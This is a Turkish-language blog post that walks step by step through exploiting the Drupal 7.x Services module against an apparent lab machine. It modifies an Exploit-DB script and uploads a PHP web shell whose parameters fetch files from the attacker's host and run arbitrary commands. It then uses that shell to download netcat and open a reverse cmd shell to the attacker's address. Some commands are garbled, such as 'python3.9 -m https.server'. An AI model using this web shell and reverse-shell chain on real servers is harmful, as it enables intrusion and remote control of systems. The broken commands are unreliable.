---
layout: post
title: Drupal 7.x Module Services Remote Shell Upload
date: 2022-02-23 21:17
author: theguler
comments: true
categories: [Hacking - Security]
---
<!-- wp:heading -->
<h2 id="exploiting-zaafiyeti-test-edelim">Exploiting – Zaafiyeti test edelim.</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>İlk olarak Drupal sürümünü belirleyelim.&nbsp;Bunun için tarayıcıdan CHANGELOG.txt dosyasına erişebiliriz, bu hazır bir Drupal şablonudur.</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li><a href="https://10.10.10.9/CHANGELOG.txt">https://10.10.10.9/CHANGELOG.txt</a></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:image {"id":4579} -->
<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-150.png" alt="" class="wp-image-4579" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Not: Drupal 7.54 sürümü olduğunu bize söylüyor.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>2. Bir sürümle ilişkili Zaafiyetler'i bulmak için searchsploit‘i kullanabiliriz.</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">searchsploit drupal 7</pre>
<!-- /wp:preformatted -->

<!-- wp:image {"id":4580} -->
<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-151.png" alt="" class="wp-image-4580" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>3. Şimdi bu betiği<strong> /home/vry4n/Desktop </strong>dizinimize indirelim.</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">searchsploit -m php/webapps/41564.php</pre>
<!-- /wp:preformatted -->

<!-- wp:image {"id":4581} -->
<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-152.png" alt="" class="wp-image-4581" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>4. Önce kodu değiştireceğiz, değiştirmemiz gereken kısmı vurguladım.</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">vi 41564.php</pre>
<!-- /wp:preformatted -->

<!-- wp:image {"id":4582,"width":608,"height":598} -->
<figure class="wp-block-image is-resized"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-153.png" alt="" class="wp-image-4582" width="608" height="598" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>5. Önce tarayıcımzı açarak $endpoint_path’in var olduğunu görelim.</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">https://10.10.10.9/rest_endpoint
404 Bulunamadı</pre>
<!-- /wp:preformatted -->

<!-- wp:image {"id":4583} -->
<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-154.png" alt="" class="wp-image-4583" /></figure>
<!-- /wp:image -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">https://10.10.10.9/rest
20OK (found)</pre>
<!-- /wp:preformatted -->

<!-- wp:image {"id":4584} -->
<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-155.png" alt="" class="wp-image-4584" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>6. Bulduk.. Simdi Aşağıdaki gibi düzenleyelim.</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">$url = ‘https://10.10.10.9’;

$endpoint_path = ‘/rest’;

$endpoint = ‘rest_endpoint’;

$file = [

&nbsp; &nbsp; ‘filename’ =&gt; ‘test.php’,

&nbsp; &nbsp; ‘data’ =&gt; ‘&lt;?php echo “Vry4n was here!!”; ?&gt;’

];</pre>
<!-- /wp:preformatted -->

<!-- wp:image {"id":4585} -->
<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-156.png" alt="" class="wp-image-4585" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>7. php-curl kurmamız gerekebilir.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">sudo apt-get install php-curl</pre>
<!-- /wp:preformatted -->

<!-- wp:image {"id":4586} -->
<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-157.png" alt="" class="wp-image-4586" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>php-curl </strong>yüklemeden önce aldığımız HATA</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4587} -->
<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-158.png" alt="" class="wp-image-4587" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Komut dosyasını yürütelim.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">php 41564.php</pre>
<!-- /wp:preformatted -->

<!-- wp:image {"id":4588} -->
<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-159.png" alt="" class="wp-image-4588" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>9. Kod başarıyla yürütüldü ve bize&nbsp;<a href="https://10.10.10.9/test.php">https://10.10.10.9/test.php</a>&nbsp;adresini ziyaret etmemizi söylüyor.</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">https://10.10.10.9/test.php</pre>
<!-- /wp:preformatted -->

<!-- wp:image {"id":4589} -->
<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-160.png" alt="" class="wp-image-4589" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>10. Dosyayı oluşturduk ve uzak Drupal sunucusunda çalıştırdık.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>11. Şimdi yeni dosyalar yükleyebilen ve komutları çalıştırabilen bir dosya oluşturacağız.&nbsp;test.php betiğimize aşağıdaki kodu ekleyeceğiz.</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">$phpCode = &lt;&lt;&lt;‘EOD’

&lt;?php

&nbsp; &nbsp; if (isset($_REQUEST[‘fupload’])) {

&nbsp; &nbsp; &nbsp; &nbsp; file_put_contents($_REQUEST[‘fupload’], file_get_contents(“https://10.10.14.12:8888/” . $_REQUEST[‘fupload’]));

&nbsp; &nbsp; };

&nbsp; &nbsp; if (isset($_REQUEST[‘fexec’])) {

&nbsp; &nbsp; &nbsp; &nbsp; echo “&lt;pre&gt;” . shell_exec($_REQUEST[‘fexec’]) . “&lt;/pre&gt;”;

&nbsp; &nbsp; };

?&gt;

EOD;

$file = [

‘filename’ =&gt; ‘vry4n.php’,

‘data’ =&gt; $phpCode

];</pre>
<!-- /wp:preformatted -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><strong>vi 41564.php</strong></pre>
<!-- /wp:preformatted -->

<!-- wp:image {"id":4590} -->
<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-161.png" alt="" class="wp-image-4590" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>12. Şimdi yeni dosyayı yüklemek için betiği tekrar çalıştıralım.</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">php 41564.php</pre>
<!-- /wp:preformatted -->

<!-- wp:image {"id":4591} -->
<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-162.png" alt="" class="wp-image-4591" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>13. Bu noktada vry4n.php dosyası yüklendi, 2 değişken kullanabiliriz&nbsp;<strong>fupload</strong>&nbsp;&amp;&nbsp;<strong>fexec</strong>&nbsp;.&nbsp;Temel komutları test etmek&nbsp;için ilk&nbsp;<strong>fexec’i</strong>&nbsp;kullanacağız.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">https://10.10.10.9/vry4n.php?fexec=dir</pre>
<!-- /wp:preformatted -->

<!-- wp:image {"id":4592} -->
<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-163.png" alt="" class="wp-image-4592" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>14. Artık komutları çalıştırabileceğimize göre,&nbsp;<strong>fupload</strong>&nbsp;işlevselliğini&nbsp;test edebiliriz&nbsp;.&nbsp;Bir resim yükleyeceğiz.&nbsp;Öncelikle bir web sunucusu başlatmamız ve script'te yazdığımız ayarların aynısını kullanmamız gerekiyor.</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">python3.9 -m https.server 8888</pre>
<!-- /wp:preformatted -->

<!-- wp:image {"id":4593} -->
<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-164.png" alt="" class="wp-image-4593" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>15. Şimdi tarayıcıya gitmemiz gerekiyor,&nbsp;<strong>fupload</strong>&nbsp;değişkenini&nbsp;kullanacağız.</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">https://10.10.10.9/vry4n.php?fupload=vk9sec.jpg

https:// 10.10.10.9/vk9sec.jpg</pre>
<!-- /wp:preformatted -->

<!-- wp:image {"id":4594} -->
<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-165.png" alt="" class="wp-image-4594" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>16. Artık herhangi bir talimat yürütmeden önce sistem hakkında bilgi toplayabiliriz.</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">https://10.10.10.9/vry4n.php?fexec=systeminfo</pre>
<!-- /wp:preformatted -->

<!-- wp:image {"id":4595} -->
<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-166.png" alt="" class="wp-image-4595" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Not: Görüldüğü üzere Yamasız bir x64 bit sistemimiz var, Microsoft Windows Server 2008 R2 Datacenter</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>17. Şimdi&nbsp;<a href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/ adresinden</a>&nbsp;Windows için bir x64 netcat indireceğiz.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://eternallybored.org/misc/netcat/"></a></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><strong>#netcat-win32-1.11.zip dosyasını açın.</strong>

cd netcat-1.11 &amp;&amp; ls

python3.9 -m https.sunucu 8888</pre>
<!-- /wp:preformatted -->

<!-- wp:image {"id":4596} -->
<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-167.png" alt="" class="wp-image-4596" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>18. Şimdi local bir dinleyici başlatalım.</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">nc -lvp 7777</pre>
<!-- /wp:preformatted -->

<!-- wp:image {"id":4597} -->
<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-168.png" alt="" class="wp-image-4597" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>19. Tarayıcıdan&nbsp;, yürütmek için&nbsp;netcat &amp;&nbsp;<strong>fexec</strong>&nbsp;yüklemek&nbsp;için&nbsp;<strong>fupload</strong>&nbsp;değişkenini kullanalım.</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">https://10.10.10.9/vry4n.php?fupload=nc64.exe&amp;fexec=nc64.exe -e cmd 10.10.14.12 7777</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>20. nc64.exe dosyasını indirmek için web sunucumuza 200 OK diyoruz.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4598} -->
<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-169.png" alt="" class="wp-image-4598" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>21. Dinleyiciyi kontrol ederken, şimdi yürütmeden sonra bir shell görmeliyiz.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4599} -->
<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-170.png" alt="" class="wp-image-4599" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>Çözüm nedir – Quick solution</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Acilen Drupal sürümünü yükseltin. – Upgrade Drupal urgently</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>ilgili link:&nbsp;<a href="https://www.exploit-db.com/exploits/41564">https://www.exploit-db.com/exploits/41564</a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Saygılarımla. – Best regards.</strong></p>
<!-- /wp:paragraph -->
